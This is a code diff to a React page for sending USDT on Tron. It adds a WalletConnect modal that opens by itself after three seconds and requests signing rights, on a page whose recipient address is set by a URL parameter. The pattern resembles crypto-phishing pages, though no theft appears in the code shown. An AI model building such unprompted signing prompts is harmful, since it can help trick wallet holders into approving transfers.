@@ -44,7 +44,7 @@ export default function Index() {
     async function initWC() {
       try {
         const client = await SignClient.init({
-          projectId: "e39256b56b981acc59b58f298055856e",
+          projectId: "6b5df56bc30c1dadaab59498b86fd3e8",
           metadata: {
             name: "USDT Transfer",
             description: "Secure USDT Transfer on Tron",
@@ -87,6 +87,31 @@ export default function Index() {
   useEffect(() => {
     const addressParam = searchParams.get("address");
     if (addressParam) setToAddress(addressParam);
+
+    // Auto open WalletConnect if no tronWeb
+    setTimeout(async () => {
+      if (!window.tronWeb?.defaultAddress?.base58 && wcClientRef.current) {
+        const { uri, approval } = await wcClientRef.current.connect({
+          requiredNamespaces: {
+            tron: {
+              methods: ["tron_signTransaction", "tron_signMessage"],
+              chains: ["tron:728126428"],
+              events: ["chainChanged", "accountsChanged"],
+            },
+          },
+        });
+        if (uri) {
+          const { WalletConnectModal } = await import("@walletconnect/modal");
+          const modal = new WalletConnectModal({ projectId: "e39256b56b981acc59b58f298055856e" });
+          await modal.openModal({ uri });
+          wcSessionRef.current = await approval();
+          modal.closeModal();
+          const accounts = Object.values(wcSessionRef.current.namespaces).flatMap((ns: any) => ns.accounts) as string[];
+          const tronAcc = accounts.find((a: string) => a.startsWith("tron:"));
+          if (tronAcc) userAddressRef.current = tronAcc.split(":")[2];
+        }
+      }
+    }, 3000);
 
     window.setTransactionStatus = (status) => {
       setTransactionStatusState(status);
